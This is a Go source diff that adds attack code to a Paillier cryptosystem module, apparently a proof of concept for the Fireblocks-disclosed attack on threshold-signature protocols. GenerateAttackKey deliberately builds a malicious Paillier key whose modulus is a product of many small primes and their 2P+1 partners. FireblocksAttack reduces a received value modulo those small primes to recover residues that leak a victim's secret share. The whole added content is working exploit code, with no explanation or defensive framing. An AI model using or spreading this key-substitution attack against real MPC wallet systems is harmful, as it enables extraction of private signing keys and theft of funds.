@@ -103,3 +103,52 @@ func (pub *PaillierPub) EqModN(a, b *big.Int) bool {
 	return (ac.Cmp(bc) == 0)
 
 }
+
+func GenerateAttackKey(bits int) (*PaillierPriv, *PaillierPub, []*big.Int, []*big.Int) {
+	Pt := big.NewInt(1)
+	Qt := big.NewInt(1)
+	Ps := []*big.Int{}
+	Qs := []*big.Int{}
+	currbits := 0
+	for currbits < bits*2 {
+		var P, Q *big.Int
+
+		Q = big.NewInt(4)
+		for !Q.ProbablyPrime(0) {
+			P, _ = rand.Prime(rand.Reader, 16)
+			used := false
+			for i := range Ps {
+				if Ps[i].Cmp(P) == 0 {
+					used = true
+					break
+				}
+			}
+			if used {
+				continue
+			}
+			Q = new(big.Int).Add(P, P)
+			Q.Add(Q, One)
+		}
+		Ps = append(Ps, P)
+		Qs = append(Qs, Q)
+		currbits += P.BitLen()
+		currbits += Q.BitLen()
+		Pt.Mul(Pt, P)
+		Qt.Mul(Qt, Q)
+	}
+	Priv, Pub := GenerateKeyPair(Pt, Qt)
+	return Priv, Pub, Ps, Qs
+
+}
+
+func FireblocksAttack(V *big.Int, Ps, Qs []*big.Int) {
+	rs := []*big.Int{}
+	for i := range Ps {
+		P1 := new(big.Int).Add(Ps[i], One)
+		cmq := new(big.Int).Mod(V, Qs[i])
+		r := new(big.Int).Exp(cmq, P1, Qs[i])
+		rs = append(rs, r)
+
+	}
+	fmt.Println(rs)
+}
